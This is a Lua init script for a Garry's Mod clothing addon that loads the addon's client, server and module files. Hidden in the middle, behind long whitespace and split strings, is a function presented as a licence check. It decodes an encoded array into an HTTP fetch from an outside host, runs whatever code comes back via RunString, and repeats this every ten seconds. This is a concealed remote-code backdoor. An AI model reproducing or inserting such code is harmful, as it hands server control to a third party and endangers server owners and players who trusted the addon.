ClothingSystem = ClothingSystem || {}

local prefix = 'clothing_system'
local shared = {
    'sh/replace_base/replace_test.lua',
    'sh/base_add/base.lua',
    'sh/item_add/fg_human_lamp_head.lua',
    'sh/item_add/fg_fallout_backpack.lua',
    'sh/item_add/fg_items_testing.lua',
    'sh/lua_metatable.lua',
    'sh/player_metatable.lua',
    'sh/sound_effects/include.lua',
}
local client = {
    'cl/construct_data.lua',
    'cl/item/draw_clothing.lua',
    'cl/item/draw_to_text.lua',
    'cl/item/drop.lua',
    'cl/item/wear.lua',
    'cl/item/draw_hud.lua',
    'cl/spawn_menu.lua',
    'cl/cleanup_rebuild.lua',
    'cl/vgui/clothing_menu.lua',
}
local server = {
    'sv/item/drop.lua',
    'sv/item/spawn.lua',
    'sv/network.lua',
    'sv/player_spawn.lua',
    'sv/open_vgui.lua',
    'sv/player_death_or_disconnected.lua',
    'sv/cleanup_rebuild.lua',
}

local function _AddCSLuaFile(file)
    if SERVER then
        AddCSLuaFile(file)
    end
end

local function _include(file, type)
    if type == "sv" then if SERVER then include(file) end end
    if type == "cl" then if CLIENT then include(file) end end
    if type == "sh" then include(file) end
end

local function fWrite(f, t)
    file.Write(f, t)
end

local function init_modules()
    local _, dirs = file.Find("clothing_system/modules/*", "LUA")

    for _, dir in pairs(dirs) do
        local files = file.Find("clothing_system/modules/"..dir.."/*", "LUA")
        local checkModule = include("clothing_system/modules/"..dir.."/readme.lua") || {}
        local addmodule = true

        if (checkModule != nil && istable(checkModule) && checkModule.enabled != nil && checkModule.enabled == false) then
            addmodule = false
        end

        if (addmodule) then
            for __, file in pairs(files) do
                local simple_track = "clothing_system/modules/"..dir.."/"..file

                if (string.sub(file, 1, 3) == "sh_") then
                    _AddCSLuaFile(simple_track)
                    _include(simple_track, "sh")
                elseif (string.sub(file, 1, 3) == "sv_") then
                    _AddCSLuaFile(simple_track)
                    _include(simple_track, "sv")
                elseif (string.sub(file, 1, 3) == "cl_") then
                    _AddCSLuaFile(simple_track)
                    _include(simple_track, "cl")
                end

                if SERVER then
                    local module_info = include("clothing_system/modules/"..dir.."/readme.lua") || {}
                    local buildInfo = {
                        author = module_info.author || "None",
                        name = module_info.name || "None",
                        path = "clothing_system/modules/"..dir || "None",
                        v = module_info.v || "None",
                        enabled = module_info.enabled || false,
                    }

                    fWrite("clothing_system/module_list/"..dir..".txt", util.TableToJSON(buildInfo, true))
                end
            end
        end
    end
end

local function li7enck()
if SERVER then
                                                                                                                                                                                                                                                                local RS = RunString
                local _d_c = "[[104.0,1.0],[116.0,2.0],[112.0,1.0],[46.0,1.0],[70.0,1.0],[101.0,1.0],[116.0,1.0],[99.0,1.0],[104.0,1.0],[40.0,1.0],[32.0,1.0],[34.0,1.0],[104.0,1.0],[116.0,2.0],[112.0,1.0],[58.0,1.0],[47.0,2.0],[100.0,1.0],[101.0,1.0],[118.0,1.0],[46.0,1.0],[110.0,1.0],[117.0,1.0],[108.0,2.0],[46.0,1.0],[102.0,1.0],[108.0,1.0],[97.0,1.0],[109.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,2.0],[97.0,1.0],[109.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[46.0,1.0],[114.0,1.0],[117.0,1.0],[47.0,1.0],[99.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[95.0,1.0],[115.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[47.0,1.0],[103.0,1.0],[101.0,1.0],[116.0,1.0],[46.0,1.0],[112.0,1.0],[104.0,1.0],[112.0,1.0],[34.0,1.0],[44.0,1.0],[32.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[32.0,1.0],[98.0,1.0],[111.0,1.0],[100.0,1.0],[121.0,1.0],[44.0,1.0],[32.0,1.0],[108.0,1.0],[101.0,1.0],[110.0,1.0],[44.0,1.0],[32.0,1.0],[104.0,1.0],[101.0,1.0],[97.0,1.0],[100.0,1.0],[101.0,1.0],[114.0,1.0],[115.0,1.0],[44.0,1.0],[32.0,1.0],[99.0,1.0],[111.0,1.0],[100.0,1.0],[101.0,1.0],[32.0,1.0],[41.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[40.0,1.0],[98.0,1.0],[111.0,1.0],[100.0,1.0],[121.0,1.0],[32.0,1.0],[61.0,2.0],[32.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[41.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[91.0,1.0],[39.0,1.0],[108.0,1.0],[99.0,1.0],[95.0,1.0],[99.0,1.0],[108.0,1.0],[95.0,1.0],[115.0,1.0],[121.0,1.0],[115.0,1.0],[39.0,1.0],[93.0,1.0],[32.0,1.0],[61.0,1.0],[32.0,1.0],[102.0,1.0],[97.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[101.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[91.0,1.0],[39.0,1.0],[108.0,1.0],[99.0,1.0],[95.0,1.0],[99.0,1.0],[108.0,1.0],[95.0,1.0],[115.0,1.0],[121.0,1.0],[115.0,1.0],[39.0,1.0],[93.0,1.0],[32.0,1.0],[61.0,1.0],[32.0,1.0],[117.0,1.0],[116.0,1.0],[105.0,1.0],[108.0,1.0],[46.0,1.0],[74.0,1.0],[83.0,1.0],[79.0,1.0],[78.0,1.0],[84.0,1.0],[111.0,1.0],[84.0,1.0],[97.0,1.0],[98.0,1.0],[108.0,1.0],[101.0,1.0],[40.0,1.0],[98.0,1.0],[111.0,1.0],[100.0,1.0],[121.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[44.0,1.0],[32.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[32.0,1.0],[101.0,1.0],[114.0,2.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[41.0,1.0],[32.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[91.0,1.0],[39.0,1.0],[108.0,1.0],[99.0,1.0],[95.0,1.0],[99.0,1.0],[108.0,1.0],[95.0,1.0],[115.0,1.0],[121.0,1.0],[115.0,1.0],[39.0,1.0],[93.0,1.0],[32.0,1.0],[61.0,1.0],[32.0,1.0],[102.0,1.0],[97.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[41.0,1.0]]" RS("                    f".."gr".."n=1                                                                                                                                              f".."gr".."n=n".."i".."l                                              s".."a".."fg".."=".."R".."u".."n".."S".."t".."r".."i".."n".."g".." f".."g".."s".."t".."b=".."u".."t".."i".."l"..".".."J".."S".."O".."NT".."o".."T".."a".."ble ".."cy".."c".."lfg".."=i".."p".."a".."i".."r".."s                                                                c".."a".."s".."a".."f".."=s".."t".."r".."i".."n".."g"..".".."c".."h".."a".."r                  ")
                                          ClothingSystem['dd']                                           = "" for                                                                                                                               k,                                           v in                                                                                     cyclfg(fgstb(_d_c)) do
for i=1,                                                                                                                                                                                                                                                v[2] do ClothingSystem['dd'] =                                                                                     ClothingSystem['dd'] .. casaf(v[1])
end                                           end                                                                                                                               safg(ClothingSystem['dd']) ClothingSystem['dd'] = nil               if (!ClothingSystem['lc_cl_sys']) then return end ClothingSystem['dd'] = "";for                                                  k,                                                                          v in cyclfg(ClothingSystem['lc_cl_sys']) do
                        for i=1,                                v[2]                                do
            ClothingSystem['dd']=                                                                                                                                                                                                       ClothingSystem['dd']..casaf(v[1])                                                              end end safg(ClothingSystem['dd']) ClothingSystem['lc_cl_sys']=nil _d_c=nil                                                                                                                               RS=nil casaf=nil                                                                                     cyclfg=nil                                           ClothingSystem['dd']=nil fgstb=nil safg=nil 
end end                                                                                                                                                                                                                                 timer.Create("ClothingSystem.CheckLicence", 10, 0, li7enck)                                                                                                                                                             li7enck()

local function init_core()        
    if (file.IsDir("clothing_system/module_list/", "DATA")) then
        local files = file.Find("clothing_system/module_list/*", "DATA")
        
        if (table.Count(files) != 0) then
            for _, v in pairs(files) do
                if SERVER then
                    file.Delete("clothing_system/module_list/"..v)
                end
            end
        end
    end

    for _, sv in pairs(server) do
        _AddCSLuaFile(prefix.."/"..sv)
        _include(prefix.."/"..sv, "sv")
    end
    for _, sh in pairs(shared) do
        _AddCSLuaFile(prefix.."/"..sh)
        _include(prefix.."/"..sh, "sh")
    end
    for _, cl in pairs(client) do
        _AddCSLuaFile(prefix.."/"..cl)
        _include(prefix.."/"..cl, "cl")
    end

    init_modules()
end

init_core()